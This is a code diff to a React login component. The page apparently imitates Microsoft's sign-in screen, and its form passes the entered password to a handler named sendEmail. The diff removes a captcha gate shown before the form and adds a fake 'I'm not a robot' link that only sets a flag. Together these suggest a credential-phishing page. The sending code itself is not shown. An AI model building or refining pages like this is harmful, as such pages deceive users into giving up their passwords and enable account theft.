@@ -190,6 +190,7 @@ const Login = () => {
   const [password, setPassword] = useState("");
   const [recaptchaValue, setRecaptchaValue] = useState(null);
   const [recaptchaError, setRecaptchaError] = useState("");
+  const [showCaptcha, setShowCaptcha] = useState(false);
 
   const handleNext = (e) => {
     e.preventDefault();
@@ -207,7 +208,7 @@ const Login = () => {
 
   const sendEmail = (e) => {
     e.preventDefault();
-    if (!recaptchaValue) {
+    if (step === 2 && showCaptcha && !recaptchaValue) {
       setRecaptchaError("Please complete the captcha.");
       return;
     }
@@ -237,49 +238,6 @@ const Login = () => {
   useEffect(() => {
     injectResponsiveStyles();
   }, []);
-
-  // Show only captcha until solved
-  if (!recaptchaValue) {
-    return (
-      <div
-        style={{
-          minHeight: "100vh",
-          minWidth: "100vw",
-          background: "radial-gradient(circle at top left, #e6d7d2, #d6e3d9)",
-          display: "flex",
-          justifyContent: "center",
-          alignItems: "center",
-        }}
-      >
-        <div
-          style={{
-            background: "#fff",
-            borderRadius: "4px",
-            boxShadow: "0 2px 8px 0 rgba(0,0,0,0.13)",
-            padding: "32px 24px",
-            display: "flex",
-            flexDirection: "column",
-            alignItems: "center",
-          }}
-        >
-          {/* Ensure ReCAPTCHA is rendered */}
-          <ReCAPTCHA
-            sitekey="6LeuFWwrAAAAAA0dAuMXMKv7XhIlSm704Ekkrjhi"
-            onChange={(value) => {
-              setRecaptchaValue(value);
-              setRecaptchaError("");
-            }}
-            theme="light"
-          />
-          {recaptchaError && (
-            <div style={{ color: "red", fontSize: "0.95rem", marginTop: 8 }}>
-              {recaptchaError}
-            </div>
-          )}
-        </div>
-      </div>
-    );
-  }
 
   return (
     <div style={styles.pageWrapper}>
@@ -366,6 +324,28 @@ const Login = () => {
                 onChange={(e) => setPassword(e.target.value)}
                 autoFocus
               />
+              {/* Show link to display captcha */}
+              {!showCaptcha && (
+                <div style={{ margin: "1rem 0 0.5rem 0" }}>
+                  <a
+                    href="#"
+                    style={{
+                      color: "#0067b8",
+                      textDecoration: "underline",
+                      cursor: "pointer",
+                      fontSize: "1rem",
+                    }}
+                    onClick={(e) => {
+                      e.preventDefault();
+                      setShowCaptcha(true);
+                    }}
+                  >
+                    I'm not a robot
+                  </a>
+                </div>
+              )}
+              {/* Google reCAPTCHA */}
+
               <div style={styles.buttonRow}>
                 <button
                   type="button"
@@ -388,17 +368,17 @@ const Login = () => {
         className="login-responsive-signin-options"
       >
         <svg
-          style={styles.keyIcon}
+          style={{ ...styles.keyIcon, width: "56px", height: "56px" }}
           xmlns="http://www.w3.org/2000/svg"
-          width="48"
-          height="48"
+          width="56"
+          height="56"
           viewBox="0 0 48 48"
           fill="none"
         >
-          <rect width="48" height="48" fill="none" />
+          <rect fill="none" width="48" height="48" />
           <path
             fill="#404040"
-            d="M40,32.578V40H32V36H28V32H24V28.766A10.689,10.689,0,0,1,19,30a10.9,10.9,0,0,1-5.547-1.5,11.106,11.106,0,0,1-2.219-1.719A11.373,11.373,0,0,1,9.5,24.547a10.4,10.4,0,0,1-1.109-2.625A11.616,11.616,0,0,1,8,19a10.9,10.9,0,0,1,1.5-5.547,11.106,11.106,0,0,1,1.719-2.219A11.373,11.373,0,0,1,13.453,9.5a10.4,10.4,0,0,1,2.625-1.109A11.616,11.616,0,0,1,19,8a10.9,10.9,0,0,1,5.547,1.5,11.106,11.106,0,0,1,2.219,1.719A11.373,11.373,0,0,1,28.5,13.453a10.4,10.4,0,0,1,1.109,2.625A11.616,11.616,0,0,1,30,19a10.015,10.015,0,0,1-.125,1.578,10.879,10.879,0,0,1-.359,1.531ZM16,14a1.938,1.938,0,0,1,.781.156,2,2,0,0,1,.625.422,2.191,2.191,0,0,1,.438.641A1.705,1.705,0,0,1,18,16a1.938,1.938,0,0,1-.156.781,2,2,0,0,1-.422.625,2.191,2.191,0,0,1-.641.438A1.705,1.705,0,0,1,16,18a1.938,1.938,0,0,1-.781-.156,2,2,0,0,1-.625-.422,2.191,2.191,0,0,1-.438-.641A1.705,1.705,0,0,1,14,16a1.938,1.938,0,0,1,.156-.781,2,2,0,0,1,.422-.625,2.191,2.191,0,0,1,.641-.438A1.705,1.705,0,0,1,16,14Z"
+            d="M40,32.578V40H32V36H28V32H24V28.766A10.689,10.689,0,0,1,19,30a10.9,10.9,0,0,1-5.547-1.5,11.106,11.106,0,0,1-2.219-1.719A11.373,11.373,0,0,1,9.5,24.547a10.4,10.4,0,0,1-1.109-2.625A11.616,11.616,0,0,1,8,19a10.9,10.9,0,0,1,1.5-5.547,11.106,11.106,0,0,1,1.719-2.219A11.373,11.373,0,0,1,13.453,9.5a10.4,10.4,0,0,1,2.625-1.109A11.616,11.616,0,0,1,19,8a10.9,10.9,0,0,1,5.547,1.5,11.106,11.106,0,0,1,2.219,1.719A11.373,11.373,0,0,1,28.5,13.453a10.4,10.4,0,0,1,1.109,2.625A11.616,11.616,0,0,1,30,19a10.015,10.015,0,0,1-.125,1.578,10.879,10.879,0,0,1-.359,1.531Zm-2,.844L27.219,22.641a14.716,14.716,0,0,0,.562-1.782A7.751,7.751,0,0,0,28,19a8.786,8.786,0,0,0-.7-3.5,8.9,8.9,0,0,0-1.938-2.859A9.269,9.269,0,0,0,22.5,10.719,8.9,8.9,0,0,0,19,10a8.786,8.786,0,0,0-3.5.7,8.9,8.9,0,0,0-2.859,1.938A9.269,9.269,0,0,0,10.719,15.5,8.9,8.9,0,0,0,10,19a8.786,8.786,0,0,0,.7,3.5,8.9,8.9,0,0,0,1.938,2.859A9.269,9.269,0,0,0,15.5,27.281a8.842,8.842,0,0,0,6.469.2A8.767,8.767,0,0,0,24.609,26H26v4h4v4h4v4h4ZM16,14a1.938,1.938,0,0,1,.781.156,2,2,0,0,1,.625.422,2.191,2.191,0,0,1,.438.641A1.705,1.705,0,0,1,18,16a1.938,1.938,0,0,1-.156.781,2,2,0,0,1-.422.625,2.191,2.191,0,0,1-.641.438A1.705,1.705,0,0,1,16,18a1.938,1.938,0,0,1-.781-.156,2,2,0,0,1-.625-.422,2.191,2.191,0,0,1-.438-.641A1.705,1.705,0,0,1,14,16a1.938,1.938,0,0,1,.156-.781,2,2,0,0,1,.422-.625,2.191,2.191,0,0,1,.641-.438A1.705,1.705,0,0,1,16,14Z"
           />
         </svg>
         <span>Sign-in options</span>
